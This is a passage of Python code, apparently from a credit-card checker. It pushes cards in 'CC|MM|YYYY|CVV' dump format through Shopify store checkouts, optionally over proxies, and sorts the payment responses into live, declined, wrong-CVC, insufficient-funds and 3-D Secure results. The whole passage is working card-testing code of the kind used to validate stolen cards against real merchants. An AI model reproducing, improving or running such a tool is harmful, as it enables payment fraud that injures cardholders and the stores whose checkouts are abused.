            if not poll_resp or not _poll_ok:
                return False, f"Poll request failed: {poll_text[:200] if poll_text else 'No response'}", gateway, total_price, currency
            
            # Parse poll response
            try:
                res_json = json.loads(poll_text)
            except json.JSONDecodeError:
                return False, f"POLL_JSON_ERROR: Invalid JSON", gateway, total_price, currency
            
            # Check for ORDER_PLACED (shopify_payments in response)
            if "shopify_payments" in str(res_json):
                return True, "ORDER_PLACED", gateway, total_price, currency
            
            # Extract processingError code
            result_code = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code', '')
            
            # Log the raw result for debugging
            print(f'[POLL] result_code={result_code!r} total_price={total_price} gateway={gateway}', file=sys.stderr)
            
            # Map specific error codes
            if result_code == 'CARD_DECLINED':
                return False, "CARD_DECLINED", gateway, total_price, currency
            elif result_code == 'INCORRECT_NUMBER':
                return False, "INCORRECT_NUMBER", gateway, total_price, currency
            elif result_code == 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT':
                return False, "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", gateway, total_price, currency
            elif result_code == 'GENERIC_ERROR':
                # Try to extract more specific error
                _poll_error = res_json.get('data', {}).get('receipt', {}).get('processingError', {})
                _poll_ext = _extract_payment_error_response(_poll_error)
                if _poll_ext and _poll_ext != 'GENERIC_ERROR':
                    return False, _poll_ext, gateway, total_price, currency
                return False, "GENERIC_ERROR", gateway, total_price, currency
            elif result_code == 'AUTHENTICATION_FAILED':
                return True, "3DS_REQUIRED", gateway, total_price, currency
            
            # String-based checks for additional patterns
            res_str = str(res_json)
            if "FRAUD_SUSPECTED" in res_str:
                return False, "FRAUD_SUSPECTED", gateway, total_price, currency
            elif "INCORRECT_ADDRESS" in res_str:
                return False, "INCORRECT_ADDRESS", gateway, total_price, currency
            elif "INCORRECT_ZIP" in res_str:
                return False, "INCORRECT_ZIP", gateway, total_price, currency
            elif "INCORRECT_PIN" in res_str:
                return False, "INCORRECT_PIN", gateway, total_price, currency
            elif "insufficient_funds" in res_str.lower():
                return False, "INSUFFICIENT_FUNDS", gateway, total_price, currency
            elif "INVALID_CVC" in res_str or "INCORRECT_CVC" in res_str:
                return False, "INCORRECT_CVC", gateway, total_price, currency
            elif "CompletePaymentChallenge" in res_str:
                return True, "3DS_REQUIRED", gateway, total_price, currency
            elif "hasOffsiteRedirect" in res_str or "hasOffsitePaymentMethod" in res_str:
                return True, "3DS_REQUIRED", gateway, total_price, currency
            elif result_code:
                # Return the code as-is if we have one
                return False, result_code, gateway, total_price, currency
            
            # Fallback: try deeper error extraction
            _receipt_data = res_json.get('data', {}).get('receipt', {})
            if _receipt_data:
                _pe = _receipt_data.get('processingError', {})
                if _pe:
                    _ext = _extract_payment_error_response(_pe)
                    if _ext and _ext != 'UNKNOWN_PAYMENT_ERROR':
                        _offsite = _payment_requires_offsite_action(_pe)
                        if _offsite:
                            return True, "3DS_REQUIRED", gateway, total_price, currency
                        return False, _ext, gateway, total_price, currency
            
            return False, "UNKNOWN_RESULT", gateway, total_price, currency
        
        except Exception as e:
            return False, f"Checkout error: {str(e)}", gateway, total_price, currency
        finally:
            try:
                await session.aclose()
            except Exception:
                pass
    
    except Exception as e:
        return False, f"Fatal error: {str(e)}", gateway, total_price, currency


def parse_cc_string(cc_string):
    """Parse credit card string in format: CC|MM|YYYY|CVV or CC|MM|YY|CVV"""
    if not cc_string:
        return None, None, None, None
    
    parts = cc_string.strip().split('|')
    if len(parts) != 4:
        return None, None, None, None
    
    cc, mes, ano, cvv = [p.strip() for p in parts]
    
    # Validate CC number (basic Luhn check)
    if not cc or not cc.isdigit():
        return None, None, None, None
    
    # Validate month
    if not mes or not mes.isdigit():
        return None, None, None, None
    month = int(mes)
    if month < 1 or month > 12:
        return None, None, None, None
    
    # Validate year
    if not ano or not ano.isdigit():
        return None, None, None, None
    year = int(ano)
    if year < 100:
        year += 2000
    
    # Validate CVV
    if not cvv or not cvv.isdigit():
        return None, None, None, None
    
    return cc, str(month), str(year), cvv


async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, shared_session=None):
    """Async wrapper for process_card with error handling."""
    try:
        result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str, shared_session=shared_session)
        success, message, gateway, price, currency = result
        print(f"[process_card_async] site={site_url} success={success} msg={message} gateway={gateway} price={price}", file=sys.stderr)
        return result
    except Exception as e:
        print(f"[process_card_async] FATAL: site={site_url} error={e}", file=sys.stderr)
        return False, f"process_card_async error: {str(e)}", "UNKNOWN", "0.00", "USD"


async def _submit_with_warm_session(warm_session, cc, mes, ano, cvv):
    """Submit a card check using a pre-warmed session.
    
    This is a placeholder for the warm session pool feature.
    It extracts the site URL and proxy from the warm session,
    then delegates to process_card with the appropriate parameters.
    """
    # Warm sessions are not yet supported with the new flow.
    # Delegate to process_card directly.
    site_url = getattr(warm_session, 'site_url', None)
    proxy_str = getattr(warm_session, 'proxy_str', None)
    variant_id = getattr(warm_session, 'variant_id', None)
    
    if not site_url:
        return False, "Warm session has no site_url", "UNKNOWN", "0.00", "USD"
    
    result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
    return result
